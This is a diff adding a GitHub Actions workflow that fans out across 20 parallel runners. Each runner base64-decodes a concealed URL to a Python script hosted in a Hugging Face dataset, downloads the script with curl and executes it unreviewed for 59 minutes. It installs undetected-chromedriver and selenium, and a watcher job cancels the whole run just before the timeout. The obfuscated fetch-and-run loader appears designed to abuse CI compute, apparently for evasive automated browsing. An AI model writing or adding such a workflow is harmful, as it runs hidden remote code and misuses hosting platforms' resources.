@@ -1,0 +1,103 @@
+name: Obsidian Horizon Watcher Sphere
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: obsidian-sphere-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watcher: stays active for 59 minutes, then cancels the entire run
+  # =================================================================
+  obsidian-watcher:
+    name: "Obsidian Watcher"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHER_DURATION: 3540
+    steps:
+      - name: Activate Watcher
+        run: |
+          echo "[WATCHER] Watcher activated for run: ${{ github.run_id }}"
+          echo "[WATCHER] Remaining active for ${WATCHER_DURATION} seconds (59-minute horizon)."
+
+          sleep "${WATCHER_DURATION}"
+
+          echo "[WATCHER] Horizon crossed — transmitting cancel directive."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHER] Cancel directive transmitted. All active and queued operations will be terminated."
+
+  # =================================================================
+  # Sphere Grid: parallel execution of Sphere nodes
+  # =================================================================
+  sphere-grid:
+    name: "SphereNode-${{ matrix.sphere_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        sphere_id: [8801, 8802, 8803, 8804, 8805, 8806, 8807, 8808, 8809, 8810, 8811, 8812, 8813, 8814, 8815, 8816, 8817, 8818, 8819, 8820]
+
+    steps:
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # Stage 1: Prepare the environment
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Prepare Environment
+        run: |
+          echo "[PREP] Preparing environment for SphereNode-${{ matrix.sphere_id }} on Linux..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # Stage 2: Fetch the sphere script
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Fetch Sphere Script
+        run: |
+          echo "[FETCH] Fetching sphere script from remote endpoint..."
+          SCRIPT_ENDPOINT=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$SCRIPT_ENDPOINT" -o sphere_script.py
+          echo "[FETCH] Sphere script fetched."
+
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # Stage 3: Install dependencies
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Install Dependencies
+        run: |
+          echo "[INSTALL] Installing dependencies..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      # Stage 4: Execute the sphere cycle (59-minute limit)
+      # ⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟⬟
+      - name: Execute Sphere Cycle
+        run: |
+          echo ">> Executing SphereNode-${{ matrix.sphere_id }} cycle..."
+
+          python3 sphere_script.py &
+          SPHERE_PID=$!
+
+          echo ">> Cycle started. Maximum runtime: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$SPHERE_PID" 2>/dev/null; then
+            echo ">> Maximum runtime reached — terminating cycle."
+            kill -9 "$SPHERE_PID"
+            echo ">> Cycle terminated by runtime controller."
+          else
+            echo ">> Cycle completed before maximum runtime."
+          fi
